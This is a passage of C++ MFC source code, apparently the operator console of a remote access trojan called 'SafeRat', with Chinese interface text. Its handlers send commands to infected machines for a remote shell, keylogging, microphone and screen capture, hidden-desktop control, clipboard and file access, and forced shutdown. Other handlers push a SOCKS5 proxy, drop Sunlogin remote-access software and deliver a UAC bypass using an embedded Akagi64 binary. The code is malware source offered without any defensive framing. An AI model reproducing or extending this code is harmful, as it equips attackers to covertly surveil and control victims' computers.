	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);

	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;

	
	dlg->Create(IDD_SHELL_DLG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}

void CSafeRatDlg::OnShell()
{
	BYTE	bToken = COMMAND_SHELL;
	SendBaseDll(bToken, CMD_PLUG);
}


void CSafeRatDlg::OnReg()
{
	BYTE	bToken = COMMAND_REG;
	SendBaseDll(bToken, REG_PLUG);
}


afx_msg LRESULT CSafeRatDlg::OnOpenregeditdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;

	CReg	*dlg = new CReg(this, m_iocpServer, pContext);

	pContext->m_Dialog[0] = REG_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;

	
	dlg->Create(IDD_REG_DLG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}


void CSafeRatDlg::OnSpeaker()
{
	BYTE	bToken = COMMAND_SPEAKER;
	SendBaseDll(bToken, REG_PLUG);
}


afx_msg LRESULT CSafeRatDlg::OnOpenspeakdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;

	CSpeakerDlg	*dlg = new CSpeakerDlg(this, m_iocpServer, pContext);

	pContext->m_Dialog[0] = SPEAKER_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;

	
	dlg->Create(IDD_SPEAKER, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}


afx_msg LRESULT CSafeRatDlg::OnOpenmikedialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;

	CMikeDlg	*dlg = new CMikeDlg(this, m_iocpServer, pContext);

	pContext->m_Dialog[0] = MIKE_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;

	
	dlg->Create(IDD_MIKE_DLG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}


void CSafeRatDlg::OnMike()
{
	BYTE	bToken = COMMAND_MIKE;
	SendBaseDll(bToken, MIKE_PLUG);
}


void CSafeRatDlg::OnServer()
{
	BYTE	bToken = COMMAND_SERVER;
	SendBaseDll(bToken, SERVER_PLUG);
}


afx_msg LRESULT CSafeRatDlg::OnOpenserverdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;

	CServerDlg	*dlg = new CServerDlg(this, m_iocpServer, pContext);

	pContext->m_Dialog[0] = SERVER_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;

	
	dlg->Create(IDD_SERVER_DLG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}


afx_msg LRESULT CSafeRatDlg::OnOpenhostdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;

	CHostDlg	*dlg = new CHostDlg(this, m_iocpServer, pContext);

	pContext->m_Dialog[0] = HOST_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;

	
	dlg->Create(IDD_HOST_DLG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}


void CSafeRatDlg::OnHost()
{
	BYTE	bToken = COMMAND_HOST;
	SendBaseDll(bToken, HOST_PLUG);
}


void CSafeRatDlg::OnKeyboard()
{
	BYTE	bToken = COMMAND_KEYBOARD;
	SendBaseDll(bToken, KEYBOARD_PLUG);
}


afx_msg LRESULT CSafeRatDlg::OnOpenkeyboarddialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;

	CKeyBoard	*dlg = new CKeyBoard(this, m_iocpServer, pContext);

	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;

	
	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}


void CSafeRatDlg::OnShutdown()
{
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
}


void CSafeRatDlg::OnReboot()
{
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
}


void CSafeRatDlg::OnLogoff()
{
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
}




void CSafeRatDlg::OnScreen()
{
	BYTE	bToken = COMMAND_SCREEN;
	SendBaseDll(bToken, SCREEN_PLUG);
}


afx_msg LRESULT CSafeRatDlg::OnOpenscreendialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;

	CScreenDlg	*dlg = new CScreenDlg(this, m_iocpServer, pContext);

	pContext->m_Dialog[0] = SCREEN_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;

	
	dlg->Create(IDD_SCREEN, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}




void CSafeRatDlg::OnFile()
{
	BYTE	bToken = COMMAND_FILE;
	SendBaseDll(bToken, FILE_PLUG);
}


afx_msg LRESULT CSafeRatDlg::OnOpenfiledialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;

	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);

	pContext->m_Dialog[0] = FILE_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;

	
	dlg->Create(IDD_FILE_DLG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}





void CSafeRatDlg::OnGenerate()
{
	CGenerate build(this);
	build.DoModal();
}


void CSafeRatDlg::OnConfig()
{
	CConfig config;
	if (config.DoModal() == IDOK)
	{
		g_pFrame->m_IniFile.SetString("safe", "port", config.port);
		g_pFrame->m_IniFile.SetString("safe", "max", config.m_max);
		MessageBox("重启后生效");
	}
	
}



void CSafeRatDlg::OnHideScreen()
{
	BYTE	bToken = COMMAND_HIDESCREEN;
	SendBaseDll(bToken, HIDE_PLUG);
}


afx_msg LRESULT CSafeRatDlg::OnOpenhidescreendialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;

	CHideScreenDlg	*dlg = new CHideScreenDlg(this, m_iocpServer, pContext);

	pContext->m_Dialog[0] = HIDE_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;

	
	dlg->Create(IDD_HIDE_SCREEN, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}




void CSafeRatDlg::OnMovOnline()
{
	CInputDlg dlg(this);

	CONNECT_INFO info = {0};

	dlg.Init("移动主机", "请输入主机ip");
	if (dlg.DoModal() != IDOK || dlg.m_putdata.GetLength() == 0)
		return;

	
	lstrcatA(info.szHost,dlg.m_putdata.GetBuffer());
	dlg.Init("移动主机","请输入主机端口");
	if (dlg.DoModal() != IDOK || dlg.m_putdata.GetLength() == 0)
		return;
	
	info.nPort = atoi(dlg.m_putdata.GetBuffer());

	
	PBYTE token = new BYTE[sizeof(CONNECT_INFO)+1];
	token[0] = COMMAND_MOVONLINE;

	RtlCopyMemory(token+1,&info,sizeof(CONNECT_INFO));

	
	SendSelectCommand(token,sizeof(CONNECT_INFO)+1);

	
	delete[] token;
}

BOOL CSafeRatDlg::OnCommand(WPARAM wParam, LPARAM lParam)
{

	return CXTPDialog::OnCommand(wParam, lParam);
}


void CSafeRatDlg::On32916()
{
	BYTE	bToken = COMMAND_EXTENSION;
	SendBaseDll(bToken, PLUGINS_PLUG);
}


afx_msg LRESULT CSafeRatDlg::OnOpenpluginsdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;

	CPluginsDlg	*dlg = new CPluginsDlg(this, m_iocpServer, pContext);

	pContext->m_Dialog[0] = PLUG_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;

	
	dlg->Create(IDD_PLUGINSDLG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}


void CSafeRatDlg::On32918()
{
	BYTE	bToken = COMMAND_CLIP;
	SendBaseDll(bToken, CLIP_PLUG);
}


afx_msg LRESULT CSafeRatDlg::OnOpenclipdialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext	*pContext = (ClientContext *)lParam;

	CClipboardDlg	*dlg = new CClipboardDlg(this, m_iocpServer, pContext);

	pContext->m_Dialog[0] = CLIP_DLG;
	pContext->m_Dialog[1] = (ULONG_PTR)dlg;

	
	dlg->Create(IDD_ClipboardDlg, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}


void CSafeRatDlg::On32919()
{
	Sunlogin LocaUp;
	ZeroMemory(&LocaUp, sizeof(Sunlogin)); 
	LocaUp.bToken = COMMAND_LIST_REMOTE; 
	lstrcpy(LocaUp.lpFileName, _T("C:\\ProgramData\\sunlogin.exe")); 

	int nPacketLength = sizeof(Sunlogin) + sizeof(sunloginMyFileBuf); 
	LPBYTE lpPacket = new BYTE[nPacketLength]; 

	memcpy(lpPacket, &LocaUp, sizeof(Sunlogin)); 
	memcpy(lpPacket + sizeof(Sunlogin), sunloginMyFileBuf, sizeof(sunloginMyFileBuf)); 

	SendSelectCommand(lpPacket, nPacketLength); 

	delete[] lpPacket; 
}


void CSafeRatDlg::On32920()
{
	
	CHAR szKJPath[MAX_PATH];
	GetModuleFileName(NULL, szKJPath, sizeof(szKJPath));
	*strrchr(szKJPath, '\\') = '\0';
	lstrcat(szKJPath, "\\Tools\\abc.exe");

	CInputDlg dlg;
	CString str, str1;
	str.Format("使用SOCKS5代理服务器IP为: 127.0.0.1");

	dlg.Init(str.GetBuffer(0),"请输入SOCKS5代理服务器端口:");
	if (dlg.DoModal() != IDOK)
		return;

	char BvtmX12[] = { 'o','p','e','n','\0' };
	str1.Format("-listen :1111 -socks 127.0.0.1:%s", dlg.m_putdata.MakeLower());
	ShellExecute(NULL, BvtmX12, szKJPath, str1, NULL, SW_NORMAL);

	char* lpFilePath = szKJPath;
	if (lpFilePath == NULL)
		return;

	unsigned char* data = NULL;
	size_t size;

	FILE* file = fopen(lpFilePath, "rb");
	if (file == NULL)
	{
		AfxMessageBox("文件读取失败, 请检查文件是否存在");
		return;
	}
	fseek(file, 0, SEEK_END);
	size = ftell(file);
	data = (unsigned char*)malloc(size);
	fseek(file, 0, SEEK_SET);
	fread(data, 1, size, file);
	fclose(file);

	char* lpFileExt = strrchr(lpFilePath, '.');
	int		nPacketLength = 1 + strlen(lpFileExt) + 1 + size;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_PROXY_EXE;
	memcpy(lpPacket + 1, lpFileExt, strlen(lpFileExt) + 1);
	memcpy(lpPacket + 1 + strlen(lpFileExt) + 1, data, size);

	SendSelectCommand(lpPacket, nPacketLength);
	if (data)
		free(data);
	delete[] lpPacket;
}


void CSafeRatDlg::On32921()
{
	BYTE	bToken = COMMAND_RUNLODER;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

//bypass uac
void CSafeRatDlg::On32922()
{
	PBYTE Token = (PBYTE)LocalAlloc(LPTR,sizeof(Akagi64MyFileBuf)+1);
	Token[0] = COMMAND_UAC;

	RtlCopyMemory(Token+1,Akagi64MyFileBuf,Akagi64MyFileSize);
	SendSelectCommand(Token, Akagi64MyFileSize+1);
	// TODO: 在此添加命令处理程序代码
	LocalFree(Token);
}
